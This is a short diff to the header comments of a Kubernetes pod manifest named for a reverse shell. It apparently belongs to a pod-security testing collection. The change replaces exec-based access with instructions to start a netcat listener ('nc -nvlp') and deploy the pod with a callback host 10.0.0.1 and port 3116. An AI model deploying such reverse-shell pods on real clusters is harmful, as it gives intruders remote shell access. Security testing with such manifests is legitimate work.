@@ -1,6 +1,6 @@
 ###########################################################
-## Deploy: kubectl -n [namespace] apply -f pod-nothing-allowed-revshell.yaml 
-## Access: kubectl -n [namespace] exec -it pod-nothing-allowed-revshell -- bash
+## Set up Listener: nc -nvlp [PORT]
+## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < pod-nothing-allowed-revshell.yaml | kubectl apply -f -
 ## Remove: kubectl -n [namespace] delete pod-nothing-allowed-revshell
 ###########################################################
 apiVersion: v1
